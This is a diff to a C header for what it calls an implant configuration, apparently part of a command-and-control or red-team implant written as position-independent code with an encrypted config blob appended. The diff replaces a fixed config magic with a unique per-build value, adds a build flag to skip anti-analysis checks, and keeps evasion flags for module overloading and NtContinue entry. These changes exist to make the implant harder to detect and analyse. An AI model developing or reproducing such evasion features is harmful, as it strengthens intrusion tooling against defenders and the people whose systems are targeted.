@@ -16,7 +16,9 @@
 /*  Constants                                                          */
 /* ------------------------------------------------------------------ */
 
-#define CONFIG_MAGIC           0x53504543  /* "SPEC" little-endian     */
+/* CONFIG_MAGIC is no longer a compile-time constant.
+ * Each build gets a unique per-build magic value patched by the builder
+ * into the cfg_magic_marker region. Use cfg_get_magic() at runtime. */
 #define CONFIG_VERSION         1
 #define CONFIG_MAX_CHANNELS    4
 #define CONFIG_KEY_INPUT_SIZE  64          /* Bytes of PIC hashed for key */
@@ -82,6 +84,7 @@ typedef struct _IMPLANT_CONFIG {
     DWORD          profile_id;
     DWORD          checkin_count;      /* Incremented each check-in       */
     DWORD          evasion_flags;      /* Bitmask of enabled evasion mods */
+    DWORD          build_flags;        /* Runtime build flags (debug, skip AA) */
 } IMPLANT_CONFIG;
 
 /* ------------------------------------------------------------------ */
@@ -91,6 +94,13 @@ typedef struct _IMPLANT_CONFIG {
 #define EVASION_FLAG_MODULE_OVERLOAD   0x01
 #define EVASION_FLAG_PDATA_REGISTER    0x02
 #define EVASION_FLAG_NTCONTINUE_ENTRY  0x04
+
+/* ------------------------------------------------------------------ */
+/*  Build flag constants (runtime debug / anti-analysis toggles)       */
+/* ------------------------------------------------------------------ */
+
+#define BUILD_FLAG_DEBUG              0x01
+#define BUILD_FLAG_SKIP_ANTIANALYSIS  0x02
 
 /* ------------------------------------------------------------------ */
 /*  Config blob header (appended after PIC binary by build_config.py)  */
@@ -107,6 +117,13 @@ typedef struct _CONFIG_BLOB_HEADER {
 /* ------------------------------------------------------------------ */
 /*  API                                                                */
 /* ------------------------------------------------------------------ */
+
+/**
+ * Return the per-build config magic value.
+ * The builder patches this into the cfg_magic_marker region at build time.
+ * The implant uses it to locate the config blob and as AEAD AAD.
+ */
+DWORD cfg_get_magic(void);
 
 /**
  * Locate config blob appended after PIC, decrypt, parse into
